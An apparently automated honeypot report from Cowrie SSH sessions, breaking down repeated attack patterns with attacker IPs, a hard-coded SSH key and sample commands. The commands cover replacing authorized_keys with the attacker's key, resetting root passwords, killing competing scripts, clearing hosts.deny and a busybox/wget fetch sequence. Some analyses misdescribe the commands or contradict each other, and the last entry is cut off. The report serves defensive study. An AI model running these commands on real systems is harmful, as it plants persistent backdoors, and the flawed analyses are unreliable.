**Objective:** Gain persistent SSH access to the system (by injecting a public‑key and setting a root password) while disabling host denial and hiding processes.  
**Techniques:**  
- `chattr`/`lockr` to lock `.ssh` directory, then overwrite it with a new key (`authorized_keys`).  
- `echo … | chpasswd | bash` to set the root password.  
- Process killing (`pkill -9`) and removal of temporary scripts.  
- System‑info commands for reconnaissance (CPU, memory, disk).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **101.36.113.241**  
- SSH public key string in `authorized_keys` (hashable if needed)  
- File names: `.ssh/authorized_keys`, `/tmp/secure.sh`, `/tmp/auth.sh`, `/etc/hosts.deny`.  

**Threat Level:** **High** – the attacker establishes a persistent backdoor with root privileges, potentially enabling further exploitation.  

**Brief Summary:** The session shows an attacker injecting an SSH key and resetting the root password to create a permanent remote access point, while disabling host denial and removing temporary scripts, indicating a high‑risk backdoor installation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:MDCcoRH25T2v"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 21108c77b9d9...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.36.113.241

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection) with reconnaissance  
**Objective:** Gain remote access via SSH and gather system information for potential exploitation or botnet recruitment.  

**Techniques:**
- `chattr -ia` & `lockr -ia` to hide the `.ssh` directory from detection.  
- Creation of a malicious SSH key in `authorized_keys`.  
- Permission changes (`chmod -R go=`) to restrict access.  
- System‑info commands (CPU, memory, disk, uname, top, whoami) for reconnaissance.  

**Indicators of Compromise (IOCs):**
- Attacker IP: **101.36.113.241**  
- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- File: `.ssh/authorized_keys` (modified).  

**Threat Level:** Medium – the attacker successfully installed a backdoor and performed reconnaissance, indicating potential for further exploitation.  

**Brief Summary:** The attacker inserted an SSH key into the honeypot’s `.ssh` directory, hid it with file attributes, then executed a series of system‑info commands to gather details about the host.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123456\n1untyeo8in7r\n1untyeo8in7r"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123456\n1untyeo8in7r\n1untyeo8in7r\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: afac3b030a80...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 14.103.127.231

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain persistent remote access to the honeypot host.  
**Techniques:**  
- Injected an RSA public key into `~/.ssh/authorized_keys` and set file permissions (`chmod -R go= ~/.ssh`).  
- Used `chattr -ia .ssh` (immutable attribute) to protect the SSH directory from tampering.  
- Attempted to change the system password via repeated `passwd` commands with a known password string.  
- Executed various system‑information queries (CPU, memory, uptime, crontab, etc.) for reconnaissance.

**Indicators of Compromise (IOCs):**  
- IP: **14.103.127.231** (attacker).  
- RSA key snippet in `authorized_keys`: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"**.  
- File path: `~/.ssh/authorized_keys`.  

**Threat Level:** **High** – the attacker successfully installed a backdoor and attempted to secure it with immutable attributes, indicating a sophisticated intrusion.

**Brief Summary:** The attacker injected a malicious SSH key into the honeypot’s authorized keys, set restrictive permissions, made the directory immutable, and tried to change the system password—all aimed at establishing persistent remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "hemant@123\nqyR64YvkNcJg\nqyR64YvkNcJg"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "hemant@123\nqyR64YvkNcJg\nqyR64YvkNcJg\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 597bb9a8466e...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 35.231.227.246

#### Analysis

**Attack Type:**  
Backdoor installation with reconnaissance – the attacker injects an SSH key and gathers system information for future exploitation.

**Objective:**  
Gain remote access via SSH (by adding a public key to `authorized_keys`) and collect host details (CPU, memory, OS, filesystem) to assess target suitability.

**Techniques & Tools Used:**
- **SSH Key Injection** – `echo … > .ssh/authorized_keys` with custom RSA key.
- **File Permission Manipulation** – `chattr -ia`, `lockr`, `chmod`.
- **System Information Retrieval** – `cat /proc/cpuinfo`, `free`, `uname`, `lscpu`, `df`, `crontab`, `whoami`, `top`.
- **Password Attempt** – `passwd` commands (likely failed).

**Indicators of Compromise (IOCs):**
- Attacker IP: 35.231.227.246  
- Public SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun...`  
- Files/commands: `.ssh`, `authorized_keys`, `lockr`, `chattr`.

**Threat Level:** Medium – the attacker successfully installed a backdoor and gathered useful system data, but no payload download or active exploitation observed.

**Brief Summary:**  
The attacker injected an SSH key to establish remote access and performed reconnaissance on the host’s hardware and software configuration.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "sdc\nGHcYdthgY53v\nGHcYdthgY53v"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "sdc\nGHcYdthgY53v\nGHcYdthgY53v\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: e802ee41110a...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.229.237

#### Analysis

**1. Attack Type:**  
Backdoor installation via SSH key injection (remote access).

**2. Objective:**  
Gain persistent remote login capability on the target machine and gather system information for further exploitation or monitoring.

**3. Techniques & Tools Used:**
- `chattr`, `lockr` to lock `.ssh` directory.
- `rm -rf .ssh; mkdir .ssh; echo … > .ssh/authorized_keys` – injection of a hard‑coded RSA public key.
- `chmod -R go= ~/.ssh` – restrict permissions.
- `passwd` piped with `echo` to set a new UNIX password (attempts to change user credentials).
- System info commands: `cat /proc/cpuinfo`, `free -m`, `uname`, `lscpu`, `df -h` – reconnaissance.

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **45.78.229.237**  
- RSA public key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```
- File path: `~/.ssh/authorized_keys`

**5. Threat Level:** **High** – attacker has established a persistent remote access point and performed reconnaissance, indicating potential for further exploitation.

**6. Brief Summary:**  
The attacker injected an SSH public key into the target’s `.ssh` directory, restricted permissions, attempted to change user credentials, and collected system information, establishing a backdoor for future remote control.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "xg1234\nbBLDNX5TnRnj\nbBLDNX5TnRnj"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "xg1234\nbBLDNX5TnRnj\nbBLDNX5TnRnj\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 9a06e73e962b...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.229.237

#### Analysis

**1. Attack Type:**  
Backdoor installation / remote access via SSH key injection (reconnaissance + persistence).

**2. Objective:**  
Gain persistent SSH access to the target machine and gather system information for further exploitation.

**3. Techniques & Tools Used:**
- `chattr -ia`, `lockr -ia` – likely custom tools to lock files/attributes.
- Creation of `.ssh/authorized_keys` with a hard‑coded RSA public key (`AAAAB3NzaC1yc2E...`).
- Permission manipulation (`chmod -R go= ~/.ssh`) to restrict access.
- System‑info commands: `cat /proc/cpuinfo`, `free -m`, `ls`, `uname`, `top`, `df`, etc. for reconnaissance.

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **45.78.229.237**  
- RSA public key string: `AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- File path: `~/.ssh/authorized_keys`

**5. Threat Level:** **Medium–High** – attacker successfully installs a backdoor and collects system details, indicating potential for further exploitation.

**6. Summary:**  
The attacker injected an SSH public key into the target’s authorized_keys file to establish remote access while gathering system information, demonstrating a sophisticated backdoor installation attempt.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "sdc\nwaPUxxFqOKop\nwaPUxxFqOKop"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "sdc\nwaPUxxFqOKop\nwaPUxxFqOKop\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: c4715a905fff...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.222.188

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain remote access to the system by creating a valid SSH credential and gather system profile data.  

**Techniques Used:**
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm -rf`, `mkdir`)  
- Injection of an RSA public key into `authorized_keys` with custom permissions (`chmod`).  
- System reconnaissance commands (CPU info, memory usage, file listings, crontab, uptime, uname, top, whoami, lscpu, df).  

**Indicators of Compromise (IOCs):**
- Attacker IP: **45.78.222.188**  
- RSA key string in `authorized_keys` (e.g., “ssh‑rsa AAAAB3NzaC1yc2EAAAABJQ…”)  
- File path: `.ssh/authorized_keys`  

**Threat Level:** Medium – moderate sophistication with a clear backdoor intent and profiling.  

**Brief Summary:** The attacker injected an SSH key into the honeypot’s `authorized_keys`, set restrictive permissions, and performed system reconnaissance to facilitate future remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "sdc\nJUqo4XDOIF2L\nJUqo4XDOIF2L"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "sdc\nJUqo4XDOIF2L\nJUqo4XDOIF2L\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 632be1168697...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 35.231.227.246

#### Analysis

**Attack Type:** Backdoor installation / reconnaissance  
**Objective:** Gain remote SSH access to the target machine and gather system‑information for further exploitation.  

**Techniques Used:**
- **SSH key injection** – creation of a new `.ssh/authorized_keys` file with an RSA public key (`ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`).  
- **File permission manipulation** – `chmod -R go= ~/.ssh` to restrict access.  
- **Hidden‑file tool** – use of `lockr -ia .ssh` (likely a utility to hide or lock files).  
- **Password change attempts** – multiple `passwd` invocations, possibly to reset the local user password.  
- **System reconnaissance** – commands such as `cat /proc/cpuinfo`, `free -m`, `ls -lh`, `uname`, `top`, `df -h` to collect hardware and resource details.

**Indicators of Compromise (IOCs):**
- RSA key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`
- File path: `.ssh/authorized_keys`
- Command: `lockr -ia .ssh`
- Attacker IP: **35.231.227.246** (United States)

**Threat Level:** Medium – the attacker successfully installed a backdoor and gathered system data, posing potential for remote exploitation.

**Brief Summary:** The attacker injected an SSH key into the honeypot’s `.ssh` directory, attempted to hide the file, changed permissions, and collected detailed system information, indicating a backdoor installation with reconnaissance intent.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "xg1234\n9Da50LrQinzq\n9Da50LrQinzq"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "xg1234\n9Da50LrQinzq\n9Da50LrQinzq\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: a8de06f9d817...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.222.188

#### Analysis



#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "xg1234\nhw9wKczNGA1a\nhw9wKczNGA1a"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "xg1234\nhw9wKczNGA1a\nhw9wKczNGA1a\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: a50b9e9c1182...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 154.73.171.250

#### Analysis

**Attack Type:** Backdoor installation / unauthorized remote access  
**Objective:** Gain persistent SSH access and root privileges on the target system.  

**Techniques Used:**  
- **SSH Key Injection** – created an `.ssh/authorized_keys` file with a random RSA key.  
- **Root Password Modification** – changed the root password to “OPWfnRr873aq”.  
- **Process & File Manipulation** – removed temporary scripts, killed processes (`secure.sh`, `auth.sh`, `sleep`), and created `/etc/hosts.deny`.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: 154.73.171.250  
- RSA key string in authorized_keys: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password: `OPWfnRr873aq`

**Threat Level:** **High** – the attacker has achieved full root access and installed a persistent backdoor.

**Brief Summary:** The attacker injected an SSH key, changed the root password, and removed temporary scripts to establish a permanent backdoor on the system.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:OPWfnRr873aq"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: d53b59743b88...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.162.232

#### Analysis

**Attack Type:** Backdoor / Remote Access Attempt  
**Objective:** Gain SSH access to the target by injecting a public‑key and attempting to alter user credentials.  
**Techniques Used:**
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm -rf`, `mkdir`, `chmod`)  
- Injection of an RSA public key into `authorized_keys`  
- Attempts to change the UNIX password via `passwd` (echoing passwords).  
- System reconnaissance commands (`cpuinfo`, `free`, `ls`, `crontab`, `uname`, `top`, `whoami`, `lscpu`, `df`).  

**Indicators of Compromise (IOCs):**
- RSA public key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File: `.ssh/authorized_keys`  
- Commands altering permissions (`chmod -R go= ~/.ssh`).  

**Threat Level:** Medium – the attacker attempted a backdoor but did not fully establish persistent access.  

**Brief Summary:** The session shows an attempt to inject an SSH key into the honeypot and perform system reconnaissance, indicating a potential remote‑access backdoor installation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "test123456\nik0S02mg1ECG\nik0S02mg1ECG"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "test123456\nik0S02mg1ECG\nik0S02mg1ECG\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: d16cc2fd01da...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 154.73.171.250

#### Analysis

**Attack Type:**  
Backdoor installation – the attacker injects an SSH public‑key into the honeypot’s `authorized_keys` file, enabling future remote SSH access.

**Objective:**  
Gain persistent remote control of the system by establishing a legitimate SSH session.

**Techniques & Tools Used:**
- **File manipulation** (`chattr`, `lockr`, `chmod`) to secure and lock the `.ssh` directory.
- **SSH key injection** via `echo … > .ssh/authorized_keys`.
- **Password change attempts** with the `passwd` command (though ineffective).
- System‑information queries (`cat /proc/cpuinfo`, `free -m`, `uname`, etc.) for reconnaissance.

**Indicators of Compromise (IOCs):**
- Attacker IP: **154.73.171.250**  
- SSH public key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```

**Threat Level:** Medium – the attacker has established a potential remote access point, but no additional payload or exploitation is evident.

**Brief Summary:**  
The session shows an attacker injecting an SSH key into the honeypot’s `authorized_keys` file and attempting to change passwords. This indicates a backdoor installation aimed at enabling future remote SSH control of the system.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "test123456\nDgGqWfGvOSpN\nDgGqWfGvOSpN"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "test123456\nDgGqWfGvOSpN\nDgGqWfGvOSpN\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 7069f302100a...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 178.163.34.244

#### Analysis

**Attack Type:**  
Botnet recruitment / back‑door installation

**Objective:**  
Download a malicious script (via `tftp`/`wget`) to a temporary file (`.s` in `/dev/shm`), then execute it using `busybox`. The goal is to install a remote control or bot on the host.

**Techniques & Tools Used:**
- **TFTP / WGET** – for payload download.
- **BusyBox** – minimal shell utility used to run the payload (`/bin/busybox YXAVL`).
- **Temporary filesystem (`/dev/shm`)** – to hide the script in memory.
- **Shell commands (`cat`, `cp`, `dd`, `while read`)** – for manipulating and executing the file.

**Indicators of Compromise (IOCs):**
- IP: 178.163.34.244
- Country: Russia
- File name: `.s` (temporary script)
- Command string: `/bin/busybox YXAVL`
- Use of `tftp`, `wget`

**Threat Level:** Medium – short session, minimal evidence of persistence or high‑impact payload.

**Brief Summary:**  
An attacker from Russia attempted to download a malicious script via TFTP/WGET into a temporary file and execute it with BusyBox, likely installing a botnet back‑door on the honeypot.

#### Sample Commands
```
enable
system
system
shell
shell
sh
cat /proc/mounts; /bin/busybox YXAVL
cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YXAVL
tftp; wget; /bin/busybox YXAVL
dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
... (+5 more)
```

---

### Pattern: e8002f4a8385...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.143.238.173

#### Analysis

**Attack Type:** Backdoor installation / botnet recruitment  
**Objective:** Gain persistent root‑level access via SSH and gather system information for further exploitation.  

**Techniques Used:**
- **SSH key injection** – `echo … > .ssh/authorized_keys` with a hard‑coded RSA key.
- **Root password reset** – `echo "root:Sz4GcRjCp4Jx"|chpasswd|bash`.
- **Process suppression** – `pkill -9 sleep`, `rm -rf /tmp/...`, and disabling `/etc/hosts.deny`.
- **System reconnaissance** – CPU, memory, uptime (`uname`, `top`, `lscpu`, etc.).

**Indicators of Compromise (IOCs):**
- Attacker IP: 103.143.238.173  
- RSA key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- File names: `.ssh/authorized_keys`, `/tmp/secure.sh`, `/tmp/auth.sh`.

**Threat Level:** **High** – root access and persistent SSH backdoor, potential for widespread exploitation.

**Brief Summary:** The attacker injected a hard‑coded SSH key into the honeypot’s authorized keys, reset the root password, suppressed system processes, and collected detailed system information to establish a persistent backdoor and prepare for further attacks.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:Sz4GcRjCp4Jx"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: e9b73bf657e6...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 81.192.46.35

#### Analysis

**Attack Type:** Backdoor installation with reconnaissance  
**Objective:** Gain SSH access to the host and gather system information for future exploitation.  

**Techniques Used:**  
- Injected an RSA public key into `~/.ssh/authorized_keys` (SSH key injection).  
- Modified permissions (`chmod -R go= ~/.ssh`) to restrict access.  
- Attempted password changes via piping into `passwd`.  
- Collected system details: CPU info, memory usage, OS architecture, crontab entries, user identity.

